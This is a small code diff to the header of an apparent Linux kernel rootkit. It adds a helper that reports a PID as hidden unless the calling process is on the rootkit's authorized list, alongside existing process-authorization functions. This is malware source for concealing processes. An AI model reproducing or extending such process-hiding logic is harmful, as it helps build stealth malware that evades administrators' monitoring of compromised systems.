@@ -1,6 +1,7 @@
 #ifndef _ROOTKIT_UTILS_H_
 #define _ROOTKIT_UTILS_H_
 
+#include "constants.h"
 #include "macro_utils.h"
 #include <asm/current.h>
 #include <linux/kstrtox.h>
@@ -212,5 +213,18 @@ long authorize_process(const pid_t i32_pid, const int i32_sig);
  * Clears the list of authorized PIDs and frees all associated memory.
  */
 void clear_auth_list(void);
+
+/**
+ * If the current process is authorized, return `false`.
+ * Otherwise, check if the given PID is hidden.
+ *
+ * @param i32_pid The PID to check
+ * @return `false` if the current process is authorized, otherwise return whether the given PID is
+ * hidden
+ */
+static inline bool check_pid_hidden_auth(const pid_t i32_pid)
+{
+    return (!is_process_authorized(PID_SELF)) && is_pid_hidden(i32_pid);
+}
 
 #endif
